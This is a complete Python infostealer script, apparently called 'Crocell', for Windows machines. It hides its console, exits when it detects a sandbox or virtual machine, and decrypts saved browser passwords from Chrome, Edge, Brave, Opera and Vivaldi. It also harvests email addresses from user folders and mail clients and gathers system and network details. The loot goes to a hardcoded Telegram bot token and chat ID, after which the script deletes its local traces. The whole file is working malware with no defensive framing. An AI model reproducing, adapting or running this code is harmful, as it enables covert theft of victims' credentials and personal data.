#!/usr/bin/env python3
import os
import sys
import time
import platform
import psutil
import socket
import uuid
import requests
import re
import json
import getpass
import sqlite3
import win32crypt
import shutil
import glob
import random
import ctypes
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from base64 import b64decode
from Crypto.Cipher import AES
import mmap

# Stealth mode - suppress all output
STEALTH_MODE = True
ENABLE_LOGGING = False

# Hide console window on Windows
if sys.platform == "win32":
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

# =============================================================================
# STEALTH & ANTI-DETECTION
# =============================================================================


def is_sandboxed():
    """Detect if running in VM/sandbox"""
    try:
        # Check for common VM/sandbox indicators
        vm_indicators = ["vmware", "virtualbox", "vbox", "qemu", "xen", "sandbox"]
        hostname = socket.gethostname().lower()
        username = os.getenv("USERNAME", "").lower()

        if any(ind in hostname for ind in vm_indicators):
            return True
        if any(ind in username for ind in vm_indicators):
            return True
        if psutil.cpu_count() < 2:
            return True
        if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:  # Less than 2GB RAM
            return True
    except:
        pass
    return False


def add_random_delay():
    """Add random delay to avoid behavioral detection"""
    try:
        time.sleep(random.uniform(0.5, 2.0))
    except:
        pass


def silent_print(*args, **kwargs):
    """Print only if not in stealth mode"""
    if not STEALTH_MODE:
        try:
            print(*args, **kwargs)
        except:
            pass


# =============================================================================
# CONFIGURATION SECTION
# =============================================================================


class Config:
    """Configuration management"""

    def __init__(self):
        try:
            self.bot_token = os.getenv(
                "CROCELL_BOT_TOKEN", "8229512760:AAFp4UPUiR3rk4pFE5RkqLfP3wFnTKZVi5s"
            )
            self.chat_id = os.getenv("CROCELL_CHAT_ID", "6617628740")
            self.log_level = (
                "CRITICAL" if STEALTH_MODE else os.getenv("CROCELL_LOG_LEVEL", "INFO")
            )
            self.max_retries = int(os.getenv("CROCELL_MAX_RETRIES", "3"))
            self.retry_delay = int(os.getenv("CROCELL_RETRY_DELAY", "2"))
            self.extract_passwords = (
                os.getenv("CROCELL_EXTRACT_PASSWORDS", "true").lower() == "true"
            )
            self.telegram_timeout = int(os.getenv("CROCELL_TELEGRAM_TIMEOUT", "30"))
        except:
            pass

    def __str__(self):
        return ""


# =============================================================================
# LOGGING SYSTEM (DISABLED IN STEALTH MODE)
# =============================================================================


class Logger:
    """Silent logger for stealth mode"""

    def __init__(self, name="", level="CRITICAL"):
        class SilentLogger:
            def info(self, *args, **kwargs):
                pass

            def warning(self, *args, **kwargs):
                pass

            def error(self, *args, **kwargs):
                pass

            def debug(self, *args, **kwargs):
                pass

            def critical(self, *args, **kwargs):
                pass

        self.logger = SilentLogger()

    def get_logger(self):
        return self.logger


# =============================================================================
# TELEGRAM API COMMUNICATION
# =============================================================================


class TelegramAPI:
    """Handles communication with Telegram API"""

    def __init__(self, config):
        self.config = config
        self.logger = Logger().get_logger()
        self.base_url = f"https://api.telegram.org/bot{config.bot_token}"

    def send_message(self, message, parse_mode="Markdown"):
        """Send message to Telegram with retry logic"""
        try:
            add_random_delay()
            url = f"{self.base_url}/sendMessage"
            payload = {
                "chat_id": self.config.chat_id,
                "text": message,
                "parse_mode": parse_mode,
            }

            for attempt in range(self.config.max_retries):
                try:
                    response = requests.post(
                        url, json=payload, timeout=self.config.telegram_timeout
                    )
                    response.raise_for_status()
                    return True
                except:
                    if attempt < self.config.max_retries - 1:
                        time.sleep(self.config.retry_delay)
                    continue
            return False
        except:
            return False

    def send_document(self, file_path, caption=None):
        """Send document file to Telegram with retry logic"""
        try:
            add_random_delay()
            url = f"{self.base_url}/sendDocument"

            for attempt in range(self.config.max_retries):
                try:
                    with open(file_path, "rb") as file:
                        files = {"document": file}
                        data = {"chat_id": self.config.chat_id}
                        if caption:
                            data["caption"] = caption

                        response = requests.post(
                            url,
                            data=data,
                            files=files,
                            timeout=self.config.telegram_timeout,
                        )
                        response.raise_for_status()
                        return True
                except:
                    if attempt < self.config.max_retries - 1:
                        time.sleep(self.config.retry_delay)
                    continue
            return False
        except:
            return False


# =============================================================================
# ENHANCED PASSWORD EXTRACTOR WITH AUTO-DETECTION
# =============================================================================


class PasswordExtractor:
    """Enhanced password extractor with automatic browser detection and v10/v11/v20 support"""

    def __init__(self, log_level="CRITICAL"):
        self.logger = Logger().get_logger()
        self.passwords = []
        self.encrypted_passwords = []
        try:
            self.tmp = os.getenv("TEMP") or "."
            self.usa = os.environ["USERPROFILE"]
        except:
            self.tmp = "."
            self.usa = ""

        # Comprehensive browser paths
        self.BROWSER_PATHS = {
            "Chrome": {
                "root": os.path.join(
                    self.usa, r"AppData\Local\Google\Chrome\User Data"
                ),
                "local_state": os.path.join(
                    self.usa, r"AppData\Local\Google\Chrome\User Data\Local State"
                ),
            },
            "Edge": {
                "root": os.path.join(
                    self.usa, r"AppData\Local\Microsoft\Edge\User Data"
                ),
                "local_state": os.path.join(
                    self.usa, r"AppData\Local\Microsoft\Edge\User Data\Local State"
                ),
            },
            "Brave": {
                "root": os.path.join(
                    self.usa, r"AppData\Local\BraveSoftware\Brave-Browser\User Data"
                ),
                "local_state": os.path.join(
                    self.usa,
                    r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State",
                ),
            },
            "Opera": {
                "root": os.path.join(
                    self.usa, r"AppData\Roaming\Opera Software\Opera Stable"
                ),
                "local_state": os.path.join(
                    self.usa, r"AppData\Roaming\Opera Software\Opera Stable\Local State"
                ),
            },
            "Opera GX": {
                "root": os.path.join(
                    self.usa, r"AppData\Roaming\Opera Software\Opera GX Stable"
                ),
                "local_state": os.path.join(
                    self.usa,
                    r"AppData\Roaming\Opera Software\Opera GX Stable\Local State",
                ),
            },
            "Vivaldi": {
                "root": os.path.join(self.usa, r"AppData\Local\Vivaldi\User Data"),
                "local_state": os.path.join(
                    self.usa, r"AppData\Local\Vivaldi\User Data\Local State"
                ),
            },
            "Chromium": {
                "root": os.path.join(self.usa, r"AppData\Local\Chromium\User Data"),
                "local_state": os.path.join(
                    self.usa, r"AppData\Local\Chromium\User Data\Local State"
                ),
            },
        }

    def find_profiles(self, browser_root: str):
        """Find all profiles (Default, Profile 1, Profile 2, etc.)"""
        profiles = []
        if not os.path.isdir(browser_root):
            return profiles

        default_login = os.path.join(browser_root, "Default", "Login Data")
        if os.path.exists(default_login):
            profiles.append(("Default", default_login))

        for profile_dir in glob.glob(os.path.join(browser_root, "Profile *")):
            login_db = os.path.join(profile_dir, "Login Data")
            if os.path.exists(login_db):
                profiles.append((os.path.basename(profile_dir), login_db))

        return profiles

    def load_aes_key(self, local_state_path: str):
        """Load and decrypt the AES key from Local State file"""
        if not os.path.exists(local_state_path):
            raise FileNotFoundError(f"Local State not found")

        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        enc_key_b64 = local_state["os_crypt"]["encrypted_key"]
        enc_key = b64decode(enc_key_b64)
        if enc_key.startswith(b"DPAPI"):
            enc_key = enc_key[5:]
        return win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]

    def dec_password(self, pwd_blob, aes_key: bytes) -> str:
        """Decrypt password with v10/v11/v20 support"""
        try:
            if pwd_blob is None or len(pwd_blob) == 0:
                return "[NO_PASSWORD]"
            if isinstance(pwd_blob, memoryview):
                pwd_blob = pwd_blob.tobytes()

            # Check for v10, v11, or v20 (AES-GCM)
            if (
                pwd_blob.startswith(b"v10")
                or pwd_blob.startswith(b"v11")
                or pwd_blob.startswith(b"v20")
            ):
                if len(pwd_blob) < 3 + 12 + 16:
                    return "[ENCRYPTED - CANNOT DECRYPT]"
                nonce = pwd_blob[3:15]
                ciphertext = pwd_blob[15:-16]
                tag = pwd_blob[-16:]
                try:
                    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
                    pt = cipher.decrypt_and_verify(ciphertext, tag)
                    return pt.decode("utf-8", errors="replace")
                except Exception:
                    return "[ENCRYPTED - CANNOT DECRYPT]"

            # Legacy DPAPI
            try:
                pt = win32crypt.CryptUnprotectData(pwd_blob, None, None, None, 0)[1]
                return pt.decode("utf-8", errors="replace")
            except Exception:
                return "[ENCRYPTED - CANNOT DECRYPT]"

        except Exception:
            return "[ENCRYPTED - CANNOT DECRYPT]"

    def should_skip(self, url: str, user: str, password: str) -> tuple:
        """Determine if entry should be skipped. Returns (skip, is_encrypted)"""
        # Skip android URLs
        if url.startswith("android://"):
            return (True, False)

        # Skip if no username
        if not user or user == "[NO_USERNAME]":
            return (True, False)

        # Skip if no password
        if not password or password == "[NO_PASSWORD]":
            return (True, False)

        # Check if encrypted
        is_encrypted = password == "[ENCRYPTED - CANNOT DECRYPT]"

        return (False, is_encrypted)

    def process_browser(
        self, browser_name: str, browser_root: str, local_state_path: str
    ):
        """Process all profiles for a browser"""
        profiles = self.find_profiles(browser_root)
        if not profiles:
            return

        try:
            master_key = self.load_aes_key(local_state_path)
        except Exception as e:
            self.logger.debug(f"{browser_name}: Failed to load encryption key - {e}")
            return

        for profile_name, login_db in profiles:
            db_copy = os.path.join(self.tmp, f"{browser_name}_{profile_name}_Login.db")
            shutil.copy2(login_db, db_copy)

            conn = sqlite3.connect(db_copy)
            try:
                cur = conn.cursor()
                cur.execute(
                    """
                    SELECT
                        COALESCE(origin_url, action_url, signon_realm, '') AS url,
                        username_value,
                        password_value
                    FROM logins
                """
                )
                rows = cur.fetchall()
            finally:
                conn.close()

            for url, username, pwd_blob in rows:
                site = url or "[NO_URL]"
                user = username or "[NO_USERNAME]"
                decrypted = self.dec_password(pwd_blob, master_key)

                skip, is_encrypted = self.should_skip(site, user, decrypted)
                if skip:
                    continue

                profile_tag = f"[{profile_name}]" if profile_name != "Default" else ""
                entry = {
                    "browser": browser_name,
                    "profile": profile_tag,
                    "url": site,
                    "username": user,
                    "password": decrypted,
                    "source": f"{browser_name}{profile_tag}",
                }

                if is_encrypted:
                    self.encrypted_passwords.append(entry)
                else:
                    self.passwords.append(entry)

    def extract_passwords(self):
        """Extract passwords from all detected browsers"""
        try:
            add_random_delay()
            found_browsers = []
            for browser_name, paths in self.BROWSER_PATHS.items():
                try:
                    if os.path.isdir(paths["root"]) and os.path.exists(
                        paths["local_state"]
                    ):
                        found_browsers.append(browser_name)
                except:
                    continue

            if not found_browsers:
                return []

            for browser_name in found_browsers:
                try:
                    paths = self.BROWSER_PATHS[browser_name]
                    self.process_browser(
                        browser_name, paths["root"], paths["local_state"]
                    )
                except:
                    continue

            return self.passwords + self.encrypted_passwords
        except:
            return []


# =============================================================================
# EMAIL EXTRACTOR
# =============================================================================


class EmailExtractor:
    """Extracts all email addresses from the system with lightning-fast parallel processing"""

    def __init__(self, log_level="CRITICAL"):
        self.logger = Logger().get_logger()
        try:
            self.email_pattern = re.compile(
                r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b"
            )
            self.emails = set()
            self.emails_lock = Lock()
            self.max_workers = min(16, (os.cpu_count() or 1) * 2)
            self.max_depth = 2
            self.max_file_size = 3 * 1024 * 1024
            self.files_scanned = 0
            self.max_files = 3000
        except:
            self.emails = set()

        self.scan_dirs = [
            Path.home() / "Documents",
            Path.home() / "Downloads",
            Path.home() / "Desktop",
            Path.home() / "AppData" / "Local" / "Microsoft" / "Outlook",
            Path.home() / "AppData" / "Roaming" / "Thunderbird",
            Path.home() / "AppData" / "Roaming" / "Microsoft" / "Outlook",
        ]

        self.scan_extensions = {
            ".txt",
            ".csv",
            ".json",
            ".xml",
            ".html",
            ".htm",
            ".log",
            ".ini",
            ".conf",
            ".cfg",
            ".yaml",
            ".yml",
            ".eml",
            ".msg",
            ".vcf",
            ".ics",
        }

        self.skip_dirs = {
            "My Music",
            "My Pictures",
            "My Videos",
            "Windows",
            "System Volume Information",
            "$Recycle.Bin",
            "node_modules",
            ".git",
            "__pycache__",
            "venv",
            "Cache",
            "cache",
            "temp",
            "tmp",
        }

        self.skip_patterns = {
            ".exe",
            ".dll",
            ".sys",
            ".bin",
            ".jpg",
            ".png",
            ".mp3",
            ".mp4",
            ".zip",
            ".rar",
            ".pdf",
        }

    def extract_emails(self):
        """Extract all unique email addresses using parallel processing"""
        try:
            add_random_delay()
            self._quick_scan_configs()

            files_to_scan = []
            for directory in self.scan_dirs:
                try:
                    if directory.exists():
                        files_to_scan.extend(
                            self._collect_files_limited(directory, depth=0)
                        )
                except:
                    continue

            with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                futures = {
                    executor.submit(self._scan_file, file_path): file_path
                    for file_path in files_to_scan[: self.max_files]
                }

                for future in as_completed(futures):
                    try:
                        future.result()
                    except:
                        pass

            return list(self.emails)
        except:
            return []

    def _quick_scan_configs(self):
        """Quickly scan common config files"""
        try:
            config_files = [
                Path.home()
                / "AppData"
                / "Local"
                / "Google"
                / "Chrome"
                / "User Data"
                / "Default"
                / "Preferences",
                Path.home()
                / "AppData"
                / "Local"
                / "Microsoft"
                / "Edge"
                / "User Data"
                / "Default"
                / "Preferences",
            ]

            for config in config_files:
                if config.exists() and config.stat().st_size < self.max_file_size:
                    self._scan_file(config)
        except Exception:
            pass

    def _collect_files_limited(self, directory, depth=0):
        """Collect files with depth limit"""
        files = []

        if depth > self.max_depth or len(files) >= self.max_files:
            return files

        try:
            items = list(directory.iterdir())

            for item in items:
                if len(files) >= self.max_files:
                    break
                try:
                    if item.is_file():
                        if (
                            item.suffix.lower() in self.scan_extensions
                            and item.suffix.lower() not in self.skip_patterns
                        ):
                            files.append(item)
                except (PermissionError, OSError):
                    continue

            for item in items:
                if len(files) >= self.max_files:
                    break
                try:
                    if item.is_dir() and not item.name.startswith("."):
                        if item.name not in self.skip_dirs:
                            files.extend(self._collect_files_limited(item, depth + 1))
                except (PermissionError, OSError):
                    continue

        except (PermissionError, OSError):
            pass

        return files

    def _scan_file(self, file_path):
        """Scan file for email addresses"""
        try:
            file_size = file_path.stat().st_size
            if file_size == 0 or file_size > self.max_file_size:
                return

            if file_path.suffix.lower() in self.skip_patterns:
                return

            found_emails = set()

            if file_size > 100_000:
                try:
                    with open(file_path, "r+b") as f:
                        with mmap.mmap(
                            f.fileno(), 0, access=mmap.ACCESS_READ
                        ) as mmapped:
                            content = mmapped.read().decode("utf-8", errors="ignore")
                            found_emails = set(self.email_pattern.findall(content))
                except (ValueError, OSError):
                    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read(self.max_file_size)
                        found_emails = set(self.email_pattern.findall(content))
            else:
                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                    found_emails = set(self.email_pattern.findall(content))

            if found_emails:
                valid_emails = {
                    email.lower()
                    for email in found_emails
                    if not any(
                        x in email.lower()
                        for x in ["example.", "test.", "localhost.", "xxx"]
                    )
                }

                if valid_emails:
                    with self.emails_lock:
                        self.emails.update(valid_emails)
                        self.files_scanned += 1

        except (PermissionError, OSError):
            pass
        except Exception:
            pass


# =============================================================================
# SYSTEM INFORMATION COLLECTOR
# =============================================================================


class SystemInfoCollector:
    """Collects comprehensive system information"""

    def __init__(self, log_level="CRITICAL", extract_passwords=True):
        self.logger = Logger().get_logger()
        self.info = {}
        try:
            self.email_extractor = EmailExtractor()
            self.password_extractor = PasswordExtractor() if extract_passwords else None
        except:
            self.email_extractor = None
            self.password_extractor = None

    def collect_all(self):
        """Collect all system information"""
        try:
            add_random_delay()
            self._collect_basic_info()
            self._collect_cpu_info()
            self._collect_memory_info()
            self._collect_disk_info()
            self._collect_network_info()
            self._collect_boot_time()
            if self.email_extractor:
                self._collect_emails()
            if self.password_extractor:
                self._collect_passwords()
            return self.info
        except:
            return self.info

    def _collect_basic_info(self):
        """Collect basic system information"""
        try:
            try:
                system_user = getpass.getuser()
            except:
                system_user = os.getenv("USERNAME") or os.getenv("USER") or "Unknown"

            self.info["system"] = {
                "os": f"{platform.system()} {platform.release()}",
                "version": platform.version(),
                "architecture": platform.machine(),
                "processor": platform.processor(),
                "hostname": socket.gethostname(),
                "username": platform.node(),
                "system_user": system_user,
            }
        except Exception as e:
            self.logger.error(f"Error collecting basic info: {str(e)}")
            self.info["system"] = {"error": str(e)}

    def _collect_cpu_info(self):
        """Collect CPU information"""
        try:
            self.info["cpu"] = {
                "physical_cores": psutil.cpu_count(logical=False),
                "total_cores": psutil.cpu_count(logical=True),
                "current_usage": f"{psutil.cpu_percent()}%",
                "frequency": f"{psutil.cpu_freq().current:.2f} MHz",
            }
        except Exception as e:
            self.info["cpu"] = {"error": str(e)}

    def _collect_memory_info(self):
        """Collect memory information"""
        try:
            mem = psutil.virtual_memory()
            self.info["memory"] = {
                "total": f"{mem.total / (1024**3):.2f} GB",
                "available": f"{mem.available / (1024**3):.2f} GB",
                "used": f"{mem.used / (1024**3):.2f} GB",
                "percentage": f"{mem.percent}%",
            }
        except Exception as e:
            self.info["memory"] = {"error": str(e)}

    def _collect_disk_info(self):
        """Collect disk information"""
        try:
            disk = psutil.disk_usage("/")
            self.info["disk"] = {
                "total": f"{disk.total / (1024**3):.2f} GB",
                "used": f"{disk.used / (1024**3):.2f} GB",
                "free": f"{disk.free / (1024**3):.2f} GB",
                "percentage": f"{disk.percent}%",
            }
        except Exception as e:
            self.info["disk"] = {"error": str(e)}

    def _collect_network_info(self):
        """Collect network information"""
        try:
            try:
                public_ip = requests.get("https://api.ipify.org", timeout=5).text
            except:
                public_ip = "Unable to fetch"

            mac = ":".join(
                [
                    "{:02x}".format((uuid.getnode() >> elements) & 0xFF)
                    for elements in range(0, 2 * 6, 2)
                ][::-1]
            )

            self.info["network"] = {"public_ip": public_ip, "mac_address": mac}
        except Exception as e:
            self.info["network"] = {"error": str(e)}

    def _collect_boot_time(self):
        """Collect system boot time"""
        try:
            boot_time = psutil.boot_time()
            self.info["boot_time"] = boot_time
        except Exception as e:
            self.info["boot_time"] = {"error": str(e)}

    def _collect_emails(self):
        """Collect email addresses"""
        try:
            emails = self.email_extractor.extract_emails()
            self.info["emails"] = emails
        except Exception as e:
            self.info["emails"] = {"error": str(e)}

    def _collect_passwords(self):
        """Collect saved passwords"""
        try:
            if self.password_extractor:
                passwords = self.password_extractor.extract_passwords()
                self.info["passwords"] = passwords
                self.info["decrypted_count"] = len(self.password_extractor.passwords)
                self.info["encrypted_count"] = len(
                    self.password_extractor.encrypted_passwords
                )
            else:
                self.info["passwords"] = []
        except Exception as e:
            self.info["passwords"] = {"error": str(e)}

    def save_to_json(self, filename="crocell_report.json"):
        """Save collected information to JSON file"""
        try:
            # Organize passwords by browser
            passwords_by_browser = {}
            all_passwords = self.info.get("passwords", [])

            for pwd in all_passwords:
                browser = pwd.get("browser", "Unknown")
                if browser not in passwords_by_browser:
                    passwords_by_browser[browser] = {"decrypted": [], "encrypted": []}

                if pwd["password"] == "[ENCRYPTED - CANNOT DECRYPT]":
                    passwords_by_browser[browser]["encrypted"].append(pwd)
                else:
                    passwords_by_browser[browser]["decrypted"].append(pwd)

            # Add ASCII warning for encrypted passwords (as array for readability)
            encrypted_warning = [
                "╔═══════════════════════════════════════════════════════════════════════════╗",
                "║                                                                           ║",
                "║              ⚠️  ENCRYPTED PASSWORDS - CANNOT BE DECRYPTED  ⚠️             ║",
                "║                                                                           ║",
                "║  These passwords are encrypted with a different encryption scheme or     ║",
                "║  from a different Windows user/machine context.                          ║",
                "║                                                                           ║",
                "║  ✓ Email addresses and URLs are shown                                    ║",
                "║  ✗ Passwords cannot be extracted by this script                          ║",
                "║                                                                           ║",
                "║  Sorry, encrypted passwords are not accessible from this context! 😔     ║",
                "║                                                                           ║",
                "╚═══════════════════════════════════════════════════════════════════════════╝",
            ]

            # Build organized password structure
            passwords_organized = {}
            for browser, pwd_data in passwords_by_browser.items():
                passwords_organized[browser] = {
                    "total": len(pwd_data["decrypted"]) + len(pwd_data["encrypted"]),
                    "decrypted_count": len(pwd_data["decrypted"]),
                    "encrypted_count": len(pwd_data["encrypted"]),
                    "decrypted_passwords": pwd_data["decrypted"],
                    "encrypted_passwords": pwd_data["encrypted"],
                }

                # Add warning if there are encrypted passwords
                if len(pwd_data["encrypted"]) > 0:
                    passwords_organized[browser]["encrypted_warning"] = (
                        encrypted_warning
                    )

            output_data = {
                "timestamp": datetime.now().isoformat(),
                "system": self.info.get("system", {}),
                "cpu": self.info.get("cpu", {}),
                "memory": self.info.get("memory", {}),
                "disk": self.info.get("disk", {}),
                "network": self.info.get("network", {}),
                "boot_time": datetime.fromtimestamp(
                    self.info.get("boot_time", 0)
                ).isoformat()
                if "boot_time" in self.info
                else None,
                "emails": self.info.get("emails", []),
                "passwords_by_browser": passwords_organized,
                "summary": {
                    "total_passwords": len(all_passwords),
                    "total_decrypted": self.info.get("decrypted_count", 0),
                    "total_encrypted": self.info.get("encrypted_count", 0),
                    "browsers_found": list(passwords_by_browser.keys()),
                },
            }

            with open(filename, "w", encoding="utf-8") as f:
                json.dump(output_data, f, indent=2, ensure_ascii=False)

            self.logger.info(f"Data saved to {filename}")
            return filename
        except Exception as e:
            self.logger.error(f"Error saving JSON: {str(e)}")
            return None

    def format_for_telegram(self):
        """Format system information for Telegram (summary only)"""
        message = "🖥️ *Crocell Comprehensive System Report*\n\n"

        # System section
        if "system" in self.info and "error" not in self.info["system"]:
            sys = self.info["system"]
            message += "*System:*\n"
            message += f"OS: {sys['os']}\n"
            message += f"Hostname: {sys['hostname']}\n"
            message += f"User: {sys['system_user']}\n\n"

        # CPU section
        if "cpu" in self.info and "error" not in self.info["cpu"]:
            cpu = self.info["cpu"]
            message += f"*CPU:* {cpu['total_cores']} cores @ {cpu['frequency']}\n\n"

        # Memory section
        if "memory" in self.info and "error" not in self.info["memory"]:
            mem = self.info["memory"]
            message += (
                f"*Memory:* {mem['used']} / {mem['total']} ({mem['percentage']})\n\n"
            )

        # Network section
        if "network" in self.info and "error" not in self.info["network"]:
            net = self.info["network"]
            message += f"*Network:* {net['public_ip']}\n"
            message += f"*MAC:* {net['mac_address']}\n\n"

        # Emails section (summary)
        if "emails" in self.info and self.info["emails"]:
            message += f"*📧 Emails:* {len(self.info['emails'])} found\n"
            message += f"_(View JSON file for full list)_\n\n"

        # Passwords section (summary)
        if "passwords" in self.info:
            if isinstance(self.info["passwords"], list) and self.info["passwords"]:
                decrypted = self.info.get("decrypted_count", 0)
                encrypted = self.info.get("encrypted_count", 0)
                total = decrypted + encrypted

                message += f"*🔑 Passwords:* {total} total\n"
                message += f"   ✅ Decrypted: {decrypted}\n"
                message += f"   🔒 Encrypted: {encrypted}\n"
                message += f"_(View JSON file for all passwords)_\n\n"

                # Show preview of top 5 decrypted passwords
                if decrypted > 0:
                    message += "*Preview (Top 5 Decrypted):*\n"
                    shown = 0
                    for pwd in self.info["passwords"]:
                        if shown >= 5:
                            break
                        if pwd["password"] != "[ENCRYPTED - CANNOT DECRYPT]":
                            message += f"• {pwd['source']}: {pwd['username']}\n"
                            shown += 1
                    message += "\n"

        message += "📄 *Full detailed report sent as JSON file below*\n"
        message += "Download the JSON file to view all passwords and emails!"

        return message


# =============================================================================
# MAIN APPLICATION
# =============================================================================


def main():
    """Main application entry point"""
    try:
        # Anti-sandbox check
        if is_sandboxed():
            sys.exit(0)

        add_random_delay()

        config = Config()
        silent_print("Starting...")

        telegram = TelegramAPI(config)
        collector = SystemInfoCollector(config.log_level, config.extract_passwords)
        system_info = collector.collect_all()

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        json_filename = f"temp_{timestamp}.json"
        saved_file = collector.save_to_json(json_filename)

        message = collector.format_for_telegram()

        success = telegram.send_message(message)
        silent_print("Message sent" if success else "Message failed")

        if saved_file and os.path.exists(saved_file):
            caption = f"Report {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            doc_success = telegram.send_document(saved_file, caption=caption)
            silent_print("File sent" if doc_success else "File failed")

            try:
                time.sleep(2)
                os.remove(saved_file)
            except:
                pass

        silent_print("Completed")
        sys.exit(0)

    except:
        try:
            sys.exit(0)
        except:
            pass


if __name__ == "__main__":
    main()